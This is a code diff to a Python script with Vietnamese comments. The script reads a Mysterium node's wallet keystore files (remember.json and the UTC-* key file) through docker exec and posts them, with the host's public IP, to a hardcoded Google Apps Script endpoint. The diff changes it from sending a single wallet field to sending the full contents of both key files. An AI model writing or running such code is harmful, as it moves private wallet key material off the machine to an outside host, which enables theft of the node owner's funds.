@@ -14,34 +14,46 @@ def get_public_ipv4():
         except:
             return "Unknown"
 
-# Get IPv4 address
+# Lấy địa chỉ IPv4
 ipv4 = get_public_ipv4()
 
-# Get Wallet information
-wallet_json = (
-    subprocess.run("docker exec myst cat /var/lib/mysterium-node/keystore/remeber.json", 
-                  shell=True, capture_output=True, text=True)
-    .stdout.strip()
-)
-wallet = json.loads(wallet_json).get("wallet", "")
+# Lấy toàn bộ dữ liệu từ remember.json
+wallet_json = subprocess.run(
+    "docker exec myst cat /var/lib/mysterium-node/keystore/remember.json",
+    shell=True, capture_output=True, text=True
+).stdout.strip()
 
-# Get UTC file name
-utc_file = (
-    subprocess.run("docker exec myst ls /var/lib/mysterium-node/keystore | grep UTC-", 
-                  shell=True, capture_output=True, text=True)
-    .stdout.strip()
-)
+try:
+    wallet_data = json.loads(wallet_json)  # Giữ nguyên toàn bộ nội dung
+except json.JSONDecodeError:
+    print("LỖI: Không thể đọc dữ liệu từ remember.json!")
+    wallet_data = {}
 
-# Get Phase information
-phase = (
-    subprocess.run(f"docker exec myst cat /var/lib/mysterium-node/keystore/{utc_file}", 
-                  shell=True, capture_output=True, text=True)
-    .stdout.strip()
-)
+# Lấy tên file UTC-*
+utc_file = subprocess.run(
+    "docker exec myst ls /var/lib/mysterium-node/keystore | grep UTC-",
+    shell=True, capture_output=True, text=True
+).stdout.strip()
 
-# Send data to Google Apps Script API
+# Lấy toàn bộ dữ liệu từ file UTC-*
+phase_json = subprocess.run(
+    f"docker exec myst cat /var/lib/mysterium-node/keystore/{utc_file}",
+    shell=True, capture_output=True, text=True
+).stdout.strip()
+
+try:
+    phase_data = json.loads(phase_json)  # Giữ nguyên toàn bộ nội dung
+except json.JSONDecodeError:
+    print("LỖI: Không thể đọc dữ liệu từ UTC file!")
+    phase_data = {}
+
+# Gửi toàn bộ dữ liệu lên Google Apps Script
 api_url = "https://script.google.com/macros/s/AKfycbxinRyh8Kl7q-SvhZYUoQLeh0-WU9gn5Mh3akiS2AQK3Wg1oN2XeZTMqJyGRPnMhL0v/exec"
-data = {"ipv4": ipv4, "wallet": wallet, "phase": phase}
+data = {
+    "ipv4": ipv4,
+    "wallet_data": wallet_data,  # Gửi toàn bộ nội dung của remember.json
+    "phase_data": phase_data     # Gửi toàn bộ nội dung của UTC file
+}
 response = requests.post(api_url, json=data)
 
-print(response.json())  # Kiểm tra kết quả
+print(response.json())  # Kiểm tra phản hồi từ Apps Script
